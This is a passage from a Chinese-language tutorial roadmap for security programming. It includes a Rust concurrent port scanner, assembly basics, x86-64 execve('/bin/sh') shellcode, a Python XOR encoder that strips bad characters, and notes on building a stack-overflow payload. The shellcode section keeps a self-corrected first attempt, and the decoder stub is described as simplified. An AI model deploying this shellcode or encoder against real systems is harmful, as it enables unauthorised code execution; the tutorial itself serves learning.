    start_port: u16,
    end_port: u16,
    max_concurrent: usize,
    timeout: Duration,
) -> Vec<ScanResult> {
    let semaphore = Arc::new(Semaphore::new(max_concurrent));
    let mut handles = Vec::new();
    
    for port in start_port..=end_port {
        let permit = semaphore.clone().acquire_owned().await.unwrap();
        let addr: SocketAddr = format!("{}:{}", target, port).parse().unwrap();
        
        handles.push(tokio::spawn(async move {
            let result = scan_port(addr, timeout).await;
            drop(permit); // 释放信号量
            result
        }));
    }
    
    let mut results = Vec::new();
    for handle in handles {
        if let Ok(result) = handle.await {
            if result.open {
                results.push(result);
            }
        }
    }
    
    results.sort_by_key(|r| r.port);
    results
}

#[tokio::main]
async fn main() {
    let target = "scanme.nmap.org";
    let results = scan_range(
        target,
        1, 1024,
        500,                    // 最大并发数
        Duration::from_secs(2), // 连接超时
    ).await;
    
    println!("\n{} 开放端口:", target);
    for r in results {
        println!("  {}", r.port);
    }
}
```

```asm
section .text
    global _start

; 函数: add_three(a, b, c) -> a + b + c
; 调用约定 (System V AMD64):
;   参数: rdi, rsi, rdx, rcx, r8, r9 (前6个整数参数)
;   返回值: rax
;   调用者保存: rax, rcx, rdx, rsi, rdi, r8, r9, r10, r11
;   被调用者保存: rbx, rbp, r12-r15

add_three:
    ; 函数序言（Prologue）
    push rbp              ; 保存旧的帧指针
    mov rbp, rsp          ; 建立新的帧指针
    
    ; 此时栈的状态：
    ; [rbp+16] = 返回地址
    ; [rbp+8]  = 旧的rbp（刚push的）
    ; [rbp]    = 当前帧指针指向这里
    
    ; 参数已在 rdi, rsi, rdx 中
    mov rax, rdi          ; rax = 第一个参数
    add rax, rsi          ; rax += 第二个参数
    add rax, rdx          ; rax += 第三个参数
    
    ; 函数尾声（Epilogue）
    mov rsp, rbp          ; 恢复栈指针
    pop rbp               ; 恢复旧的帧指针
    ret                   ; 返回（弹出返回地址并跳转）

_start:
    ; 准备参数
    mov rdi, 10           ; 第一个参数
    mov rsi, 20           ; 第二个参数
    mov rdx, 30           ; 第三个参数
    call add_three        ; 调用函数，结果在rax中
    
    ; rax = 60 (10 + 20 + 30)
    
    ; 退出
    mov rdi, rax          ; 用结果作为退出码
    mov rax, 60
    syscall
```

```asm
; 
; 目标：执行 execve("/bin/sh", NULL, NULL)
; 
; 约束：
; 1. 不能有null字节（null会截断字符串复制）
; 2. 尽可能短（shellcode空间有限）
; 3. 位置无关（不依赖固定地址）
;
; 编译: nasm -f elf64 execve_shellcode.asm
; 提取: objdump -d execve_shellcode.o | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/../\x&/g' | tr -d '\n'

section .text
    global _start

_start:
    ; 清零寄存器（XOR自身 = 0，比mov reg, 0更短且无null字节）
    xor rsi, rsi        ; rsi = NULL (argv)
    xor rdx, rdx        ; rdx = NULL (envp)
    
    ; 将 "/bin/sh" 压入栈
    ; 注意：不能直接 mov [mem], "/bin/sh" 因为会有null字节
    ; 技巧：先push一个足够大的值，然后修改低位字节
    push rsi            ; 压入null终止符（8字节的0）
    mov rax, 0x68732f6e69622f  ; "/bin/sh\0" 的小端序（但末尾是\0）
    ; 等一下，上面的值包含了null，换个方式：
    
    ; 更好的方法：
    xor rsi, rsi
    push rsi            ; null终止符
    mov rax, 0x68732f2f6e69622f  ; "nib/hs//"（注意双斜杠，合法路径）
    push rax
    mov rdi, rsp        ; rdi = 指向 "/bin/sh\0" 的指针
    
    ; execve 系统调用号 = 59
    xor rax, rax
    mov al, 59          ; al = 59 (execve的系统调用号)
    ; 注意：mov al, 59 不会有null字节，而 mov rax, 59 的机器码会包含null
    syscall
```

#### 练习5：Shellcode编码器

```python
#!/usr/bin/env python3
"""
Shellcode编码器 - 绕过坏字符

使用场景：
- 漏洞利用时，某些字节不能出现在shellcode中
  - 0x00 (null): 终止字符串复制
  - 0x0a (换行): 终止fgets读取
  - 0x0d (回车): 终止某些协议解析
- 编码器将shellcode转换为不包含坏字符的形式
- 解码器stub在运行时还原原始shellcode
"""

import sys
import random

def xor_encode(shellcode: bytes, bad_chars: bytes = b'\x00') -> tuple:
    """
    XOR编码：找到一个key字节，使得shellcode中没有任何字节与key异或后产生坏字符
    
    原理：如果 shellcode[i] XOR key != bad_char 对所有i成立
    则 key != shellcode[i] XOR bad_char 对所有i成立
    """
    for key in range(1, 256):
        valid = True
        for byte in shellcode:
            encoded = byte ^ key
            if encoded in bad_chars:
                valid = False
                break
        if valid:
            encoded = bytes([b ^ key for b in shellcode])
            return key, encoded
    
    raise ValueError("找不到合适的XOR key")

def generate_decoder_stub(key: int, length: int) -> bytes:
    """
    生成x86-64 XOR解码器stub
    这段代码在运行时将编码后的shellcode还原
    """
    # 以下是一个简化的解码器stub（实际使用需要更精细的构造）
    stub = (
        b'\x48\x31\xc9'                    # xor rcx, rcx
        b'\xb1' + bytes([length]) +         # mov cl, length
        b'\x48\x31\xf6'                    # xor rsi, rsi
        b'\x48\x31\xff'                    # xor rdi, rdi  
        b'\xeb\x0a'                        # jmp short decode
        # encoded_data 放在这里
        # decode:
        b'\x5e'                            # pop rsi (获取数据地址)
        b'\x8a\x06'                        # mov al, [rsi]
        b'\x34' + bytes([key]) +           # xor al, key
        b'\x88\x06'                        # mov [rsi], al
        b'\x48\xff\xc6'                    # inc rsi
        b'\x48\xff\xc9'                    # dec rcx
        b'\x75\xf3'                        # jnz decode
    )
    return stub

def main():
    # 示例：execve shellcode
    shellcode = (
        b"\x48\x31\xf6"                    # xor rsi, rsi
        b"\x48\x31\xd2"                    # xor rdx, rdx
        b"\x56"                            # push rsi
        b"\x48\xb8\x2f\x62\x69\x6e"
        b"\x2f\x73\x68\x00"               # mov rax, '/bin/sh\0' -- 包含null!
        b"\x50"                            # push rax
        b"\x48\x89\xe7"                    # mov rdi, rsp
        b"\x48\x31\xc0"                    # xor rax, rax
        b"\xb0\x3b"                        # mov al, 59
        b"\x0f\x05"                        # syscall
    )
    
    bad_chars = b'\x00\x0a\x0d'
    
    print(f"原始shellcode长度: {len(shellcode)} 字节")
    print(f"坏字符: {bad_chars.hex()}")
    
    key, encoded = xor_encode(shellcode, bad_chars)
    print(f"XOR密钥: 0x{key:02x}")
    print(f"编码后长度: {len(encoded)} 字节")
    print(f"编码后shellcode: {encoded.hex()}")
    
    # 验证编码结果不含坏字符
    for bad in bad_chars:
        if bad in encoded:
            print(f"❌ 错误: 编码后仍包含 0x{bad:02x}")
            sys.exit(1)
    print("✅ 编码结果不含坏字符")
    
    # 验证解码正确
    decoded = bytes([b ^ key for b in encoded])
    assert decoded == shellcode, "解码结果不匹配！"
    print("✅ 解码验证通过")

if __name__ == '__main__':
    main()
```

```c
    // gets()不检查长度，经典的栈溢出漏洞
```

分析步骤：

3. 构造payload覆盖返回地址
4. 理解ASLR、Stack Canary、NX bit等防御机制如何阻止这种攻击

### 本阶段常见陷阱

| 陷阱 | 正确做法 |
|------|---------|
| 忘记shellcode中有null字节 | 编写后用`objdump`检查每个字节 |
| 混淆AT&T和Intel语法 | NASM默认Intel语法，GDB默认AT&T语法，用`set disassembly-flavor intel`切换 |
| 忽略栈对齐要求 | x86-64要求16字节对齐，不对齐会导致segfault |
| 直接在shellcode中硬编码地址 | 使用相对地址和位置无关代码（PIC） |
| 不理解大小端序 | x86是小端序，内存中低位字节在低地址 |

## 第五阶段：综合实战与持续精进

### 跨语言对比学习法

同一功能用四种语言实现，对比安全特性和性能：

| 维度 | JavaScript | Go | Rust | Assembly |
|------|-----------|-----|------|----------|
| 内存管理 | 垃圾回收 | 垃圾回收 | 所有权系统 | 手动管理 |
| 缓冲区溢出 | 不可能 | 不可能 | 编译期阻止 | 常见漏洞 |
| 并发安全 | 单线程+事件循环 | goroutine（运行时检查） | 编译期保证 | 需手动同步 |
| 输入验证 | 运行时检查 | 运行时检查 | 类型系统+运行时 | 无保护 |
| 学习曲线 | 低 | 中 | 高 | 很高 |

### 开源安全项目贡献

从简单到复杂：

1. **文档改进**：为安全工具补充使用文档（最简单的入门方式）
2. **Bug报告**：使用工具时发现问题，提交详细的Issue
3. **测试用例**：为安全工具编写测试（理解代码的同时提升覆盖率）
4. **小功能PR**：实现工具的一个小功能或修复一个简单Bug
5. **核心贡献**：深入理解项目架构后，贡献核心功能

推荐项目：
- **nmap**（C/C++）：网络扫描的行业标准
- **sqlmap**（Python）：SQL注入自动化检测
- **nuclei**（Go）：基于模板的漏洞扫描
- **rustscan**（Rust）：高性能端口扫描器
- **radare2**（C）：逆向分析框架
